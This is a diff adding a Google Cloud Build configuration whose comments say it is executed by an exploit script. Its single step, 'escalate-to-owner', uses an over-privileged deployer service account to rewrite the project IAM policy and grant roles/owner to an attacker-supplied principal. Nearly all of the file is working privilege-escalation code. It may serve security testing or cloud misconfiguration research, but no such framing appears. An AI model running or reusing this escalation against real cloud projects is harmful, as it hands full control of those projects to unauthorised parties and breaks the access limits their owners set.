@@ -1,0 +1,29 @@
+# Build config executed by exploit.sh.
+# It runs UNDER the over-privileged deployer SA, so its single step can rewrite
+# the project IAM policy and grant roles/owner to any principal.
+#
+# Cloud Build substitutions:  $PROJECT_ID is built-in; ${_TARGET_MEMBER} is passed in.
+# Shell command substitution is written as $$(...) so Cloud Build does not try to
+# expand it at substitution time.
+steps:
+  - id: escalate-to-owner
+    name: gcr.io/cloud-builders/gcloud
+    entrypoint: bash
+    args:
+      - -c
+      - |
+        set -e
+        echo "[build] executing as: $$(gcloud config get-value account 2>/dev/null)"
+        echo "[build] granting roles/owner to ${_TARGET_MEMBER} on project $PROJECT_ID"
+        gcloud projects add-iam-policy-binding "$PROJECT_ID" \
+          --member="${_TARGET_MEMBER}" \
+          --role="roles/owner" \
+          --condition=None -q
+        echo "[build] IAM policy rewritten - escalation step completed."
+
+substitutions:
+  _TARGET_MEMBER: "serviceAccount:REPLACE_ME"
+
+# Required when a build uses a user-specified service account on the default pool.
+options:
+  logging: CLOUD_LOGGING_ONLY
